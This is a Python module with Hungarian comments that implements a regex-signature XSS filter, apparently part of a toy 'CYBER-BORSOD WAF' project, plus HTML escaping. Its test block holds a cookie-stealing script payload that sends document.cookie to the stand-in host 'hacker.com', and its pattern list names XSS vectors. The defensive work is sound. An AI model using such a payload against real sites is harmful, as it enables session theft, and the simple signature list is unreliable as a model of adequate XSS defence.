# ==============================================================================
# FÁJL NÉV: 061_web_parameter_xss_filter.py
# SORSZÁM: 061
#
# LEÍRÁS ÉS FELADAT:
# Cross-Site Scripting (XSS) injekció szűrő modul. 
# A 5TB-os adatfolyam és az API végpontok felé érkező szöveges beviteleket tisztítja. 
# Reguláris kifejezésekkel (Regex) kiszűri a kártékony HTML/JavaScript kódokat 
# (pl. <script>, alert()), megakadályozva, hogy a támadók böngésző-alapú 
# adathalász vagy session-eltérítő kódokat ágyazzanak a rendszerbe.
# ==============================================================================

import re
import html

class WebXssFilter:
    def __init__(self):
        # Rosszindulatú JavaScript és HTML injekciós minták szignatúrái
        self.xss_signatures = [
            r"<script.*?>.*?</script.*?>",
            r"javascript\s*:",
            r"onmouseover\s*=",
            r"onerror\s*=",
            r"<iframe.*?>.*?</iframe>"
        ]

    def sanitize_input_parameter(self, user_input_string):
        print("=========================================================")
        print("   CYBER-BORSOD WAF -> SCRIPT INJECTION XSS FILTER       ")
        print("=========================================================")
        print(f"[*] Auditing payload parameter data robustness...")
        
        cleaned_data = user_input_string
        is_attack = False
        
        # 1. BIZTONSÁGI ELLENŐRZÉS: Aláírás alapú kártékony minták keresése
        for signature in self.xss_signatures:
            if re.search(signature, cleaned_data, re.IGNORECASE):
                print(f"  [🚨 XSS INJECTION DETECTED] Hostile script element identified!")
                print(f"    [!] Triggered Pattern: {signature}")
                is_attack = True
                break
                
        # 2. VÉDELMI LÉPÉS: HTML entitássá alakítás (HTML Encoding / Escape)
        # Ha a kód tovább is jutna, karakterként jelenik meg, nem futtatható kódként
        safe_output = html.escape(cleaned_data)
        
        if is_attack:
            print("    [🛡️ ACTION] Intercepting request. Input escaped and isolated.")
        else:
            print("[🟢 COMPLIANT] Input contains zero executable client-side scripts. Cleared.")
            
        print(f"  [-] Output Context: {safe_output[:60]}")
        print("=========================================================")
        return not is_attack

if __name__ == "__main__":
    filter_engine = WebXssFilter()
    
    # Teszt eset: Ellenséges cookie-lopó támadási kísérlet
    attack_payload = "<script>fetch('hacker.com' + document.cookie)</script>"
    filter_engine.sanitize_input_parameter(attack_payload)
